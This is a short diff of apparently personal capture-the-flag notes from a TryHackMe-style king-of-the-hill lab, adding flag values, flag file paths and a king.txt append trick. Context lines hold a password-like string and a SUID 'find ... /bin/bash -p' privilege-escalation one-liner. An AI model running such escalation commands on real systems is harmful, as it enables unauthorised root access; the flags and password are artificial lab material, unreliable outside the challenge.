@@ -111,6 +111,11 @@ passwd:-`G)8(t/NDkZ"u^{
 
 find . -exec /bin/bash -p \; -quit
 '''
+
+'''
+*cant write to king.txt but appending works
+echo 'username' >> king.txt
+'''
 		
 
 
@@ -148,6 +153,11 @@ thm{5e7ea083245c2971820ee4d00ed74e29}
 thm{8934b42e39ea3a1529b36390954f0f2a}
 '''
 
+'''
+/var/www/html/web3/flag.txt
+thm{43f20e3ed108dda8c2383e5fa0286854}
+'''
+
 >users
 '''
 root
@@ -170,6 +180,12 @@ upload.php
 
 '''
 /var/www/html/web1/web.db
+/var/www/html/web2/flag.txt
+/var/www/html/web3/flag.txt
+/home/bobba/flag1.txt
+/home/yoda/flag2.txt
+/home/duku/flag3.txt
+/root/flag4.txt
 '''
 
 '''
